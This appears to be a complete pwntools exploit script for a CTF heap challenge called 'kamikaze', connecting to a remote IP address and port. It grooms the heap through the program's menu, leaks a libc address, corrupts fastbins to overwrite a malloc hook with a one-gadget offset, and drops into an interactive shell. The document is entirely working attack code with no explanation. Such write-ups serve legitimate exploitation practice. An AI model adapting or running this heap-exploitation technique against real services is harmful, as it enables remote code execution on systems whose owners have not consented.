from pwn  import *

#r = process(["./kamikaze"])
r = remote("185.168.131.14", 6200)
def create(weight,size,content,hook):
	r.sendlineafter(">>","1")
	r.sendlineafter(":",str(weight))
	r.sendlineafter(":",str(size))
	r.sendlineafter(":",content)
	r.sendafter(":",hook)


def edit(weight, content):
	r.sendlineafter(">>","2")
	r.sendlineafter(":",str(weight))
	r.sendafter(":",content)


def KAMIKAZE(weight, seed):
	r.sendlineafter(">>","3")
	r.sendlineafter(":",str(weight))
	r.sendlineafter(":",str(seed))


def remove(weight):
	r.sendlineafter(">>","4")
	r.sendlineafter(":",str(weight))


def play(idx):
	r.sendlineafter(">>","5")
	r.sendlineafter(":",str(idx))


create(0,0x28,"a","a")
create(1,0x28,"a","a")
create(2,0x28,"a","a")
remove(1)
remove(0)
remove(2)

create(4444,0x60,"a","a")
create(1,0x60,"a","a")
create(2,0x60,"a","a")
create(3,0x60,"a","a")
create(4,0x60,"a","a")
create(5,0x60,"a","a")


create(6,0x10,"a","a"*0x10)
remove(6)
create(6,0x20,"a","a"*0x10)
create(7,0x10,"a","b"*0x10)
KAMIKAZE(7,0x2)
KAMIKAZE(7,0x2)

remove(5)
remove(4)
remove(3)
remove(2)
remove(1)


for i in range(0x11):
	print hex(i)
	create(6+i,0x70,"a",chr(i+0x41)*0x10)

create(101,0x30,"a","a"*0x10)
create(102,0x60,"a","a"*0x10)
remove(102)
create(102,0x10,"a","a")
create(103,0x60,"a","a"*0x10)
KAMIKAZE(103,0xe)
create(104,0x40,"a","a"*0x10)
create(105,0x40,"a","a"*0x10)

play(6)
r.recvuntil(": ")

libc = int(r.recvline(),16)- 0x3c4b78
print hex(libc)

remove(105)
create(105,0x60,p64(0xdeed)+p64(libc+0x3c4b50)+p64(0),"a")
create(106,0x60,"a","a")
remove(106)
edit(0xdeed,p64(libc+0x3c4afd)[:6])
create(107,0x60,"aaa"+p64(libc+0xf02a4),"a")
r.sendlineafter(">>","1")
r.interactive()
